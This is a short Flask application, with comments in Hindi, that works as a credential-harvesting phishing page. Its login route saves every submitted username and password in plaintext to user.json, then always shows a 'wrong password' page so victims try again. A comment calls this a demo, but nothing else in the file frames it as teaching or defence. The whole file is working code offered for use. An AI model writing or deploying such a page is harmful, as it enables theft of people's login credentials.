from flask import Flask, render_template, request
import json
import os

app = Flask(__name__)
USER_FILE = 'user.json'

def save_to_json(username, password):
    # फाइल मौजूद है तो डेटा लोड करें, नहीं तो खाली लिस्ट बनाएं
    if os.path.exists(USER_FILE):
        try:
            with open(USER_FILE, 'r') as f:
                data = json.load(f)
                # सुनिश्चित करें कि डेटा एक लिस्ट है
                if not isinstance(data, list):
                    data = []
        except (json.JSONDecodeError, IOError):
            data = []
    else:
        data = []
    
    # नया यूजर डेटा जोड़ें
    data.append({
        "username": username,
        "password": password
    })
    
    # डेटा को फाइल में सेव करें
    try:
        with open(USER_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except IOError as e:
        print(f"Error saving to JSON file: {e}")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return render_template("wrong_password.html", username=username or "")

        # JSON में डेटा सेव करें
        save_to_json(username, password)

        # हमेशा wrong password पेज दिखाएं (डेमो के लिए)
        return render_template("wrong_password.html", username=username)
    
    return render_template("login.html")

if __name__ == '__main__':
    # सुनिश्चित करें कि डायरेक्टरी में लिखने की अनुमति है
    if not os.path.exists(USER_FILE):
        try:
            with open(USER_FILE, 'w') as f:
                json.dump([], f)
        except IOError as e:
            print(f"Error creating JSON file: {e}")
    
    app.run(debug=True)